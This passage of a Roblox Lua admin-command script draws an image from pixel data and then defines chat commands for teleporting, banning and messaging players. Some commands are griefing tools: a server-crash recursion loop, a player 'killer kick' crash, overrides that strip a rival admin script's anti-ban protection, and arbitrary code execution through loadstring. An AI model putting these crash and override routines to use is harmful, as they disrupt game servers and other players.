{0.624,0.376,0.267},{0.647,0.392,0.278},{0.663,0.408,0.294},{0.694,0.443,0.322},{0.722,0.463,0.341},{0.749,0.494,0.369},{0.78,0.525,0.4},{0.804,0.561,0.431},{0.831,0.58,0.447},{0.851,0.6,0.471},{0.871,0.62,0.486},{0.89,0.639,0.506},{0.906,0.659,0.525},{0.922,0.675,0.549},{0.937,0.694,0.573},{0.941,0.706,0.576},{0.949,0.71,0.588},{0.949,0.71,0.584},{0.949,0.714,0.588},{0.953,0.722,0.588},{0.957,0.718,0.584},{0.957,0.722,0.584},{0.961,0.722,0.588},{0.961,0.714,0.576},{0.961,0.718,0.584},{0.961,0.714,0.573},{0.953,0.702,0.561},{0.949,0.702,0.561},{0.941,0.694,0.553},{0.941,0.698,0.553},{0.945,0.694,0.553},{0.953,0.706,0.565},{0.969,0.725,0.588},{0.976,0.733,0.604},{0.976,0.737,0.616},{0.98,0.733,0.624},{0.984,0.745,0.627},{0.984,0.749,0.627},{0.98,0.729,0.6},{0.976,0.71,0.576},{0.976,0.706,0.573},{0.976,0.714,0.588},{0.965,0.702,0.573},{0.961,0.706,0.576},{0.965,0.714,0.592},{0.957,0.71,0.58},{0.957,0.71,0.58},{0.953,0.698,0.569},{0.725,0.616,0.635},{0.725,0.616,0.635},{0.722,0.608,0.627},{0.722,0.612,0.627},{0.722,0.616,0.635},
{0.722,0.612,0.627},{0.71,0.6,0.62},{0.722,0.616,0.631},{0.729,0.62,0.635},{0.722,0.612,0.627},{0.722,0.612,0.631},{0.718,0.604,0.624},{0.725,0.612,0.631},{0.722,0.612,0.627},{0.725,0.612,0.627},{0.722,0.608,0.627},{0.718,0.6,0.62},{0.702,0.584,0.604},{0.694,0.576,0.596},{0.698,0.584,0.6},{0.706,0.588,0.608},{0.71,0.592,0.612},{0.702,0.588,0.604},{0.698,0.584,0.6},{0.698,0.576,0.596},{0.71,0.596,0.612},{0.741,0.635,0.651},{0.745,0.643,0.659},{0.718,0.6,0.616},{0.722,0.604,0.62},{0.741,0.639,0.651},{0.761,0.663,0.678},{0.761,0.663,0.675},{0.757,0.659,0.671},{0.753,0.655,0.667},{0.741,0.639,0.655},{0.718,0.6,0.62},{0.698,0.58,0.592},{0.698,0.58,0.588},{0.714,0.596,0.608},{0.69,0.565,0.576},{0.671,0.545,0.553},{0.698,0.478,0.384},{0.698,0.451,0.329},{0.659,0.424,0.302},{0.62,0.384,0.271},{0.576,0.341,0.243},{0.545,0.314,0.224},{0.541,0.306,0.216},{0.549,0.306,0.216},{0.561,0.318,0.224},{0.58,0.325,0.22},{0.592,0.337,0.235},{0.616,0.369,0.251},{0.643,0.388,0.275},{0.678,0.424,0.306},{0.702,0.443,0.318},{0.733,0.478,0.353},
{0.769,0.514,0.384},{0.804,0.557,0.424},{0.827,0.58,0.443},{0.851,0.604,0.463},{0.871,0.62,0.482},{0.894,0.639,0.506},{0.91,0.663,0.529},{0.918,0.671,0.533},{0.937,0.694,0.565},{0.941,0.698,0.565},{0.945,0.702,0.576},{0.953,0.71,0.58},{0.953,0.714,0.584},{0.953,0.706,0.573},{0.953,0.71,0.576},{0.953,0.71,0.573},{0.961,0.718,0.58},{0.961,0.718,0.58},{0.961,0.722,0.58},{0.953,0.714,0.573},{0.953,0.702,0.561},{0.949,0.698,0.553},{0.945,0.694,0.549},{0.945,0.698,0.553},{0.945,0.698,0.553},{0.945,0.702,0.549},{0.957,0.706,0.561},{0.965,0.714,0.569},{0.969,0.725,0.592},{0.973,0.729,0.6},{0.98,0.733,0.608},{0.98,0.733,0.608},{0.98,0.722,0.592},{0.976,0.698,0.573},{0.973,0.69,0.557},{0.965,0.686,0.541},{0.961,0.694,0.565},{0.957,0.694,0.569},{0.953,0.702,0.576},{0.953,0.71,0.576},{0.949,0.702,0.569},{0.945,0.698,0.565}}
Width = 100
Height = 100
scale = 2
StarterCFrame = CFrame.new(30,5,0)
p = Instance.new("Part",workspace)
p.CFrame = StarterCFrame
p.Anchored = true
p.Transparency = 1
p.CanCollide = false
m = Instance.new("BillboardGui")
m.Parent = p
m.Adornee = p
m.Size = UDim2.new(0,100*scale,0,100*scale)
m.AlwaysOnTop = true
i = 0
for x=1,Height do
for y=1,Width do
i=i+1
b = Instance.new("Frame") --- less laggy o3o
b.Size = UDim2.new(0,scale,0,scale)
coroutine.resume(coroutine.create(function()
b.Position = UDim2.new(0,x*scale,0,y*scale) --- pixel movement o3o
b.Parent = m
b.BorderSizePixel = 0
b.BackgroundColor3 = Color3.new(Values[i][1],Values[i][2],Values[i][3])
end))
end
wait(0.04)
end	
	
end)
Command("Home", 1, "Brings The Speaker Home", function(Msg, Speaker)
	repeat wait() until Speaker.Character:findFirstChild("Torso")
	if Work:findFirstChild("Base") then
		Speaker.Character.Torso.CFrame = Work.Base.CFrame * CFrame.new(0, 5, 0)
	else
		Speaker.Character.Torso.CFrame = CFrame.new(0, 5, 0)
	end
	
end)

Command("Freeze", 3, "Freeze's A Player", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				v.Character.Torso.Anchored = true
				Ping("Froze "..v.Name, Speaker, 5)
			end)
		end
	end
end)


Command("Thaw", 3, "Thaw's A Player", function(Msg, Speaker)
	wait(3)
	Ping("Something went wrong",Speaker,5)
	end)

Command("FF", 3, "Gives A Player A ForceField", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				Instance.new("ForceField", v.Character)
			end)
		end
	end
end)

Command("UnFF", 3, "Removes A Player's ForceField", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				RemObj(v.Character, "ForceField")
			end)
		end
	end
end)

Command("TP", 2, "Teleports A Player To Another Player", function(Msg, Speaker)
	local Split = GetSplit(Msg)
	local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
	local PlrTab2 = getPlayer(Speaker, Msg:sub(Split + 1))
	if #PlrTab > 0 and #PlrTab2 > 0 then
		for i,v in pairs(PlrTab) do
			ypcall(function()
				for _,v2 in pairs(PlrTab2) do
					ypcall(function()
						v.Character.Torso.CFrame = v2.Character.Torso.CFrame * CFrame.new(0, 5 * i, 0)
					
					end)
				end
			end)
		end
	end
end)

Command("Msg",2, "Creates a Message",
	function(Msg,Speaker)
		Message(Msg)
end)

Command("H",2, "Creates a Hint",
	function(Msg,Speaker)
		Hint(Msg)
end)

Command("Sm",2, "Creates a System message",
	function(Msg,Speaker)
		SystemMsg(Msg)
end)

function Message(str,p)
	if p==nil then
		for _,Player in pairs(game.Players:GetPlayers()) do
			coroutine.wrap(function()
				local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
				local Text = Instance.new("TextLabel", Msg)
				Text.Position = UDim2.new(0, 0, 0.7, 0)
				Text.Font=2
				Text.FontSize=9
				Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
				Text.BackgroundTransparency = 0.4
				Text.TextColor3 = Color3.new(1, 1, 1)
				Text.TextTransparency = 1
				Text.TextWrap = true
				Text.Text = tostring(str)
				Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0.7, 0), "Out", "Back", 2)
				Text.TextTransparency = 0
				Num = #str * 0.06
				wait(3)
				Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
				wait(Num)
				Msg:Remove()
			end)()
		end
	else
		Player=p;
		coroutine.wrap(function()
			local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
			local Text = Instance.new("TextLabel", Msg)
			Text.Position = UDim2.new(0, 0, 0.7, 0)
			Text.Font=2
			Text.FontSize=9
			Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
			Text.BackgroundTransparency = 0.1
			Text.TextColor3 = Color3.new(1, 1, 1)
			Text.TextTransparency = 1
			Text.TextWrap = true
			Text.Text = tostring(str)
			Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0.7, 0), "Out", "Back", 2)
			Text.TextTransparency = 0
			Num = #str * 0.06
			wait(3)
			Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
			wait(Num)
			Msg:Remove()
		end)()
	end
end
function SystemMsg(str)
	for _,Player in pairs(game.Players:GetPlayers()) do
		coroutine.wrap(function()
			local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
			local Text = Instance.new("TextLabel", Msg)
			Text.Position = UDim2.new(0, 0, 0, 0)
			Text.Font='Legacy'
			Text.FontSize = "Size48"
			Text.BackgroundColor3 = Color3.new(-1,-1,-1)
			Text.BackgroundTransparency = 0.4
			Text.TextColor3 = Color3.new(1,1,1)
			Text.TextTransparency = 0
			Text.TextWrap = true
			Text.Text = ' [ System ] \n ' .. tostring(str)
			Text:TweenSizeAndPosition(UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0), "Out", "Back", 2)
			Text.TextTransparency = 0.1
			Num = #str * 0.06
			wait(6)
			Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
			wait(Num)
			Msg:Remove()
		end)()
	end
end
function Hint(str,p)
	if p == nil then
		for _,Player in pairs(game.Players:GetPlayers()) do
			coroutine.wrap(function()
				local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
				local Text = Instance.new("TextLabel", Msg)
				Text.Position = UDim2.new(0, 0, 0, 0)
				Text.Font=2
				Text.FontSize=9
				Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
				Text.BackgroundTransparency = 0.4
				Text.TextColor3 = Color3.new(1, 1, 1)
				Text.TextTransparency = 1
				Text.TextWrap = true
				Text.Text = tostring(str)
				Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0, 0), "Out", "Back", 2)
				Text.TextTransparency = 0
				Num = #str * 0.06
				wait(3)
				Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
				wait(Num)
				Msg:Remove()
			end)()
		end
	else
		Player=p
		coroutine.wrap(function()
			local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
			local Text = Instance.new("TextLabel", Msg)
			Text.Position = UDim2.new(0, 0, 0, 0)
			Text.Font=2
			Text.FontSize=9
			Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
			Text.BackgroundTransparency = 0.1
			Text.TextColor3 = Color3.new(1, 1, 1)
			Text.TextTransparency = 1
			Text.TextWrap = true
			Text.Text = tostring(str)
			Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0, 0), "Out", "Back", 2)
			Text.TextTransparency = 0
			Num = #str * 0.06
			wait(3)
			Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
			wait(Num)
			Msg:Remove()
		end)()
	end
end

Command("Explore", 3, "Opens An Object Explorer", function(Msg, Speaker)
	MakeExplorer(Speaker)
end)


Command("Sinfo", 0, "Show the Script info", function(Msg, Speaker)
	wait()
	Dismiss(Speaker)
	NumBanned = 0
	NumCmds = 0
	for i = 1, #Rankings do
		if Rankings[i].Rank < 0 then
			NumBanned = NumBanned + 1
		end
	end
	for i,v in pairs(Commands) do
		NumCmds = NumCmds + 1
	end
	Ping("KAJ Tablets!", Speaker)
	Ping("Editor,", Speaker, nil, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..string.reverse("4611tlaboC"))
	Ping("Second Editor,", Speaker, nil, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..string.reverse("21wopih"))
	Ping("I started this on 6/9/2014", Speaker)
	
	Ping(#All2.." players online in the server",Speaker)
	Ping(NumCmds.." Commands",Speaker)
	Ping(NumBanned.." players banned", Speaker,5)
	
end)

Command("ShowR", 0, "Shows All Player Ranks", function(Msg, Speaker)
	Dismiss(Speaker)
	for i,v in pairs(All()) do
		Ping(v.Name.."'s Rank: "..FindRank(v))
	end
end)

Command("Speed", 2, "Change speed of a player", function(Msg, Speaker)
	local Split = GetSplit(Msg)
	local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
	local Speed = tonumber(Msg:sub(Split + 1))
	for _,v in pairs(PlrTab) do
		ypcall(function()
			v.Character.Humanoid.WalkSpeed = Speed
			Ping("Set "..v.Name.."'s WalkSpeed To "..tostring(Speed), Speaker)
		end)
	end
end)

Command("UnAb", 2, "Removes CBA Anti-Bans", function(Msg, Speaker)
	local RemoveAB = Instance.new("StringValue")
	RemoveAB.Name = "CBA Attachment"
	RemoveAB.Value = [[CBA.override=true;]]
	RemoveAB.Parent = Work
	Ping("Removed All CBA Anti-Bans", Speaker, 5)
end)

Command("Injected", 5, "Shows Injected Players", function(Msg, Speaker)
	Dismiss(Speaker)
	for i,v in pairs(Injected) do
		Ping(i, Speaker)
	end
end)

Command("UnCba", 3, "Removes CBA Admin", function(Msg, Speaker)
	local RemoveCBA = Instance.new("StringValue")
	RemoveCBA.Name = "CBA Attachment"
	RemoveCBA.Value = [[CBA.remove = false]]
	RemoveCBA.Parent = Work
	Ping("Removed All CBA Admins", Speaker, 5)
end)

Command("Shutdown", 4, "Shutdowns The Server", function(Msg, Speaker)
	local function BufferOverflow(object)
		object.DescendantAdded:connect(BufferOverflow)
		Instance.new("IntValue", object)
	end
	BufferOverflow(Game)
end)

Command("Kk", 4, "Killer Kick a player", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				Crash1(v)
				
			end)
		end
	end
end)

Command("Ban", 3, "Bans A Player From The Server", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				ChangeRank(v, -1)
			end)
		end
	end
end)


Command("UnBan", 4, "Un-Bans A Player From The Server", function(Msg, Speaker)
	ypcall(function()
		local PlrTab = getPlayer(Speaker, Msg)
		if #PlrTab > 0 then
			for _,v in pairs(PlrTab) do
				ypcall(function()
					Insert(UnMuteSource, v.Backpack, v.Character, v.PlayerGui)
				end)
			end
		end
		local PlrName = ChangeRank(Msg, 0)
		Ping("Un-Banned "..PlrName, Speaker, 5)
	end)
end)

Command("Menu", 0, "Brings Up Admin Menu", function(Msg, Speaker)
	Dismiss(Speaker)
	Ping("Commands", Speaker, nil, function()
		Dismiss(Speaker.Name)
		Ping("You Are Rank: "..tostring(GetRank(Speaker.Name).Rank), Speaker)
		Ping("All", Speaker, nil, function() OpenCmds(1337, Speaker) end)
		Ping("Rank 0", Speaker, nil, function() OpenCmds(0, Speaker) end)
		Ping("Rank 1", Speaker, nil, function() OpenCmds(1, Speaker) end)
		Ping("Rank 2", Speaker, nil, function() OpenCmds(2, Speaker) end)
		Ping("Rank 3", Speaker, nil, function() OpenCmds(3, Speaker) end)
		Ping("Rank 4", Speaker, nil, function() OpenCmds(4, Speaker) end)
		Ping("Rank 5", Speaker, nil, function() OpenCmds(5, Speaker) end)
	end)
	Ping("Players", Speaker, nil, function()
		ListPlayers(Speaker)
	end)
end)

Command("Players", 0, "Brings Up Players", function(Msg, Speaker)
	ListPlayers(Speaker)
end)

Command("Exe", 4, "Executes A Source", function(Msg, Speaker)
	local Func,Error = loadstring(Msg)
	getfenv(Func).print = function(...) local Rtn = "" for _,v in pairs({...}) do Rtn = Rtn..tostring(v).."\t" end Ping(Rtn, Speaker) end
	getfenv(Func).Speaker = Speaker
	if Error == nil then
		coroutine.wrap(function()
			Func()
		end)()
		Ping("Executed Script!", Speaker, 5)
	else
		Ping(Error, Speaker, 10)
	end
end)

Command("Insert", 5, "Inserts A Local Script Into A Player", function(Msg, Speaker)
	if LS ~= nil then
		local Split = GetSplit(Msg)
		local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
		local LocalSource = Msg:sub(Split + 1)
		if #PlrTab > 0 then
			for _,v in pairs(PlrTab) do
				local Inserted = LS:Clone()
				Inserted.Disabled = true
				Inserted.Parent = v.Backpack or v.Character or v.PlayerGui
				if OwnSource ~= nil and Inserted:findFirstChild(OwnSource) ~= nil then
					Inserted:findFirstChild(OwnSource).Value = v.Name
				end
				Inserted[LSSource].Value = LocalSource
				Inserted.Disabled = false
			end
		end
	else
		Ping("ERROR: Local Script Not Found", Speaker, 5)
	end
end)

Command("Ping", 1, "Pings A Message", function(Msg, Speaker)
	Msg = tostring(Msg)
	Ping(Msg, Speaker)
end)

Command("Test", 1, "Test's That Admin Is Working", function(Msg, Speaker)
	Dismiss(Speaker)
	for i,v in pairs(getfenv(1)) do
		ypcall(function()
			Ping(tostring(i)..": "..tostring(v), Speaker)
		end)
	end
end)

Command('Ranks', 0, 'Shows all players in ranking table',
function(Msg,Speaker)
for _,v in pairs(Rankings) do
Ping(v.Name.."'s Rank: "..v.Rank,Speaker,nil,nil,nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
end
end)


Command("Setr", 6, "Ranks A Player", function(Msg, Speaker)
	local Split = GetSplit(Msg)
	local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
	local Rank = tonumber(Msg:sub(Split + 1))
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			if v.Name ~= Owner then
				ChangeRank(v, Rank)
				Ping("Set "..v.Name.."'s Rank To "..tostring(Rank), Speaker, 5)
			end
		end
	end
end)

Command("Kajr", 5, "Remove the tablets", function(Msg, Speaker)
	Dismiss()

	Removed = true
	for i,v in pairs(getfenv(1)) do
		getfenv(1)[i] = nil
	end
	script.Disabled = true
end)




